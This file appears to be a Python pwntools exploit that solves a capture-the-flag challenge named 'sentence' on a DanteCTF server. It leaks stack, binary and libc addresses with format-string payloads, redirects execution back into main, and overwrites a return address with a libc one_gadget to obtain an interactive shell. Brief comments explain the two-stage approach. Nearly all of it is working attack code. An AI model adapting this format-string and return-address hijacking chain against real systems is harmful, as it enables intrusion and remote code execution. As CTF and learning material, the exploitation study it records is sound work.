from pwn import *

context.binary = elf = ELF('./sentence')
libc = ELF('./libc.so.6')

one = 0x50a37

# io = process()
# gdb.attach(io, api=True)
io = remote('challs.dantectf.it', 31531)

# 1st stage (main + stack)
log.info("Round 1:")
io.recvuntil(b'name: \n')
io.sendline(b'%13$p%15$p')

io.recvuntil(b', ')
leaks = io.recvuntil(b' ').split(b'0x')
elf.address = int(leaks[1], 16) - 0x1229
stack_ret = int(leaks[2], 16) - 272
log.info(f"Stack address: {hex(stack_ret)}\nAddress of main: {hex(elf.sym['main'])}")

io.recvuntil(b'hell: \n')
io.sendline(str(elf.sym['main']+5).encode())

io.recvuntil(b'her: \n')
io.sendline(str(stack_ret).encode())
# At this point when the main function end, our rbp is set to 1 so we can not do a one_gadget ROP
# We must return to main again but skip the push rbp so that at the end of main the 'leave' instruction will pop the value 0 into rbp
# By then we can do a one_gadget ROP

# 2nd stage (libc)
log.info("Round 2:")
io.recvuntil(b'name: \n')
io.sendline(b'%29$p')

io.recvuntil(b', ')
leaks = io.recvuntil(b' ').split(b'0x')
libc.address = int(leaks[1], 16) - 128 - libc.sym['__libc_start_main']
log.info(f"Libc base: {hex(libc.address)}")

io.recvuntil(b'hell: \n')
io.sendline(str(libc.address+one).encode())

io.recvuntil(b'her: \n')
io.sendline(str(stack_ret+16).encode())
io.interactive()